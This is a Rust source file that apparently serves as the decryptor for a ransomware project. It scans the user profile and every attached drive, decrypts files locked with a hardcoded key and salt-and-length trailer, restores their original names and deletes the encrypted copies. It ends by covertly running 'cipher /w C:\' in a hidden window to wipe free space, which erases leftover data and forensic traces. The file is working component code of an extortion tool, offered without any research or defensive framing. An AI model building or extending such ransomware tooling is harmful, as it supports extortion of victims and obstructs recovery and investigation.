use std::path::PathBuf;
use std::process::Command;
use std::os::windows::process::CommandExt;
use std::{env, fs};

mod config;

fn main() {
    let drives = get_drives();
    let files = get_files(&drives);

    for file in files.iter().rev() {
        process_file(&file);
    }

    _ = Command::new("cipher")
        .arg("/w")
        .arg("C:\\")
        .creation_flags(0x08000000)
        .spawn();
}

fn get_files(drives: &Vec<PathBuf>) -> Vec<PathBuf> {
    drives.iter()
        .flat_map(|a| lib::file::get_files(a))
        .collect()
}

fn get_drives() -> Vec<PathBuf> {
    let mut drives = Vec::new();

    let main_drive = env::var("SYSTEMDRIVE")
        .unwrap_or("C:".to_string());

    let user_profile = env::var("USERPROFILE").unwrap();

    drives.push(PathBuf::from(user_profile));

    for letter in b'A'..=b'Z' {
        let drive = format!("{}:\\", letter as char);
        let path = PathBuf::from(&drive);

        if drive.starts_with(&main_drive) {
            continue;
        }

        if path.metadata().is_ok() {
            drives.push(path);
        }
    }

    drives
}

fn process_file(file: &PathBuf) {
    let data = match fs::read(file) {
        Ok(res) => res,
        Err(_) => return
    };

    let mut sep_1 = None;
    let mut sep_2 = None;

    for i in (0..data.len()).rev() {
        if data[i] == b'.' {
            if sep_2.is_none() {
                sep_2 = Some(i);
            } else if sep_1.is_none() {
                sep_1 = Some(i);
                break;
            }
        }
    }

    if sep_2 == None {
        return;
    }

    let metadata_start = match sep_1 {
        Some(pos) => pos,
        None => return
    };

    let salt_end = metadata_start;
    let salt_start = salt_end - 32;
    let salt = &data[salt_start..salt_end];

    let metadata = &data[metadata_start..];
    let the_metadata = match String::from_utf8(metadata.to_vec()) {
        Ok(res) => res,
        Err(_) => return
    };

    let parts = the_metadata
        .trim_start_matches('.')
        .split('.')
        .collect::<Vec<&str>>();

    if parts.len() != 2 {
        return;
    }

    let name_len = match parts[0].parse::<usize>() {
        Ok(res) => res,
        Err(_) => return
    };

    let extension_len = match parts[1].parse::<usize>() {
        Ok(res) => res,
        Err(_) => return
    };

    let encrypted_contents = &data[..salt_start];

    let key = lib::hash::hash_key(config::KEY, &salt.to_vec());
    let decrypted_contents = lib::crypto::decrypt(encrypted_contents, &key);

    if decrypted_contents.len() < 32 + name_len + extension_len {
        return;
    }

    let decrypted_contents_len = decrypted_contents.len() - 32 - name_len - extension_len;
    let file_contents = &decrypted_contents[..decrypted_contents_len];

    let name_start = decrypted_contents_len + 32;
    let extension_start = name_start + name_len;

    let name = String::from_utf8_lossy(&decrypted_contents[name_start..extension_start]);
    let extension = String::from_utf8_lossy(&decrypted_contents[extension_start..]);

    let parent = file
        .parent()
        .unwrap();

    let original_name = if extension.is_empty() {
        format!("{}", name)
    } else {
        format!("{}.{}", name, extension)
    };

    let original_file = parent.join(original_name);

    match fs::write(&original_file, file_contents) {
        Ok(_) => {},
        Err(_) => return
    };

    lib::file::delete_file(file);

    if config::DEBUG {
        println!("done decryption for - {}", file.display());
    }
}